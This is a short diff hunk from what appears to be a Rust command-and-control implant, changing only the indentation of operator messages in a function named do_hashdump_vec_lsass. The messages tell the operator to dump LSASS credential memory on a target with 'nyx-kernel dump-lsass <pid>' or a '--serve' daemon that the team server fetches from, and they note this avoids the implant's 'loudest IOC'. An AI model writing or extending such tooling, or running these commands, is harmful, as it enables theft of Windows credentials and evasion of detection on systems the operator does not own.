@@ -310,14 +310,14 @@ unsafe fn do_hashdump_vec_lsass(rt: &'static Runtime) -> Vec<Response> {
     let msg = if lsass_pid == 0 {
         String::from(
             "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
-             LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
-             lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
-             `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
+                     LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
+                     lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
+                     `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
         )
     } else {
         let mut m = String::from(
             "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
-             LSASS — loudest IOC). LSASS pid=",
+                     LSASS — loudest IOC). LSASS pid=",
         );
         crate::fmt::push_decimal_u32(&mut m, lsass_pid as u32);
         m.push_str(". On the target run: `nyx-kernel dump-lsass ");
